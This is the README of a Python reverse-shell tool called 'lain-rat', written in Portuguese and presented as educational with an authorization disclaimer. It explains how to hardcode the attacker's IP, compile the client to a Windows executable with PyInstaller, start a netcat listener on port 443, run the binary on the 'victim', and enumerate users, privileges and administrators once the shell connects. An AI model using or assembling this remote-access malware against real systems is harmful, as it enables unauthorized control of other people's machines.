# lain-rat — Reverse Shell de Estudo

Reverse shell simples em Python desenvolvido para fins educacionais e testes em ambiente controlado.

> **AVISO:** Use apenas em máquinas e redes que você possui ou tem autorização explícita para testar.

---

## Como funciona

O malware (cliente) conecta de volta ao atacante assim que executado. O atacante recebe um shell remoto e pode executar comandos na máquina alvo.

```
Vitima (lain.exe) ────► Atacante (seu IP:443)
                ◄──────── envia comandos
                ────────► retorna saída
```

---

## Requisitos

- Python 3.x
- PyInstaller (`pip install pyinstaller`)
- Netcat no lado do atacante

---

## Configuração

Edita o arquivo `lain.py` e define o IP do atacante:

```python
IP = "192.168.1.100"  # seu IP
PORT = 443
```

---

## Compilar o executável

```bash
pyinstaller lain.spec
```

O binário gerado estará em `dist/lain.exe`.

---

## Uso

### 1. No atacante — iniciar o listener

```bash
nc -lvnp 443
```

### 2. Na vítima — executar o binário

Executa o `lain.exe` na máquina alvo.

### 3. Shell recebido

```
connect to [192.168.1.100] from (UNKNOWN) [192.168.1.X] XXXXX
```

Agora você digita comandos normalmente.

---

## Comandos úteis após acesso

```bash
whoami              # usuário atual
whoami /priv        # privilégios
hostname            # nome da máquina
net user            # usuários locais
net localgroup administrators  # admins
tasklist            # processos rodando
dir                 # listar diretório
```

### Mudar diretório

```bash
cd C:\Users
```

### Encerrar sessão

```
/exit
```

---

## Limitações

- IP hardcoded no binário
- Sem criptografia (tráfego em texto claro)
- Facilmente detectado por antivírus
- Buffer limitado a 1024 bytes por comando
